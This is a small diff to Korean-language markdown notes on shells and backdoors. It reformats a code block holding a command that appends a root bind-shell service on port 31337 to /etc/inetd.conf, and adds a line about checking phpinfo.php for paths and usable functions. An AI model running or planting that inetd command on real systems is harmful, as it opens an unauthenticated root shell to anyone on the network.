@@ -8,10 +8,12 @@
 
 ---
 # inetd.conf(옛날 리눅스 환경)
-`
+```bash
 echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"
-`
+```
 
 - 31337번 포트로 바인드 셸 연결
 
 ---
+# PHP
+- phpinfo.php 파일에서 경로 및 사용 가능 코드 확인
